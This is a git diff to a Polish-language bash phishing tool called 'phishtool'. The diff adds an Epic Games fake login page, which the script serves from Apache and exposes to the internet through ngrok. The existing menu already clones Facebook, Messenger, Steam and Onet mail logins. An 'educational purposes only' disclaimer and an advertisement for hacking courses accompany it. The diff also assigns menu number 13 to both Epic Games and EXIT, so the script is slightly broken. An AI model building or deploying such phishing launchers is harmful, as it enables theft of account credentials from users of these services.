@@ -2,6 +2,16 @@
 sudo service apache2 start
 
 
+
+epicgames_login_page()
+{
+	echo "wybrales epicgames";
+	sudo rm /var/www/html/index.html
+	sudo cp epicgames/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+}
+
 facebook_login_page()
 {
 	echo "wybrales fb";
@@ -125,7 +135,7 @@ echo " -------------------------------------------------------------------------
 echo "   Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.5"
 echo "   Uzywaj tylko do celow naukowych.                                             "
 echo " ------------------------------------------------------------------------------ "
-echo -e "\e[5m  KUP KURS NA WWW.EHAKER.PL \e[0m"
+echo -e "\e[5m  KUP KURSY HACKINGU NA WWW.EHAKER.PL \e[0m"
 echo "Wybierz opcje"
 echo "================="
 echo -e "\e[31m  [1] Facebook\e[0m"
@@ -140,6 +150,7 @@ echo -e "\e[31m  [9] Messenger\e[0m"
 echo -e "\e[31m  [10] Steam\e[0m"
 echo -e "\e[31m  [11] Facebook Secure Page\e[0m"
 echo -e "\e[31m  [12] Poczta Onet\e[0m"
+echo -e "\e[31m  [13] Epic Games\e[0m"
 echo -e "\e[92m  [13] EXIT \e[0m"
 echo "================="
 
@@ -162,6 +173,7 @@ case "$opcja" in
   "10") steam_login_page ;;
   "11") facebook_secure_login_page ;;
   "12") poczta_onetlogin_page ;;
+  "13") epicgames_login_page ;;
   "13") exit_work ;;
   *)  clear && ./run.sh
   
